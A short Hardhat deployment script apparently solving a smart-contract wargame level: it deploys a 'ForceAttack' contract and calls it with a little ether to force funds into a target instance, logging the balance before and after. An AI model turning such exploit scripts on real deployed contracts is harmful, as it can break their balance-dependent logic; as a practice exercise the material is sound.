import { ethers } from "hardhat";
import { ForceAttack__factory } from "../typechain/factories/contracts/ForceAttack__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0x8be0bb208A1F24C17206494A0bBa2A28805E794f";
    console.log(await provider.getBalance(instance_address));

    let attack = await new ForceAttack__factory(signer).deploy();
    await attack.deployed();

    let tx = await attack.attack(instance_address, {value: ethers.utils.parseEther("0.00001")});
    await tx.wait();
    console.log(await provider.getBalance(instance_address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
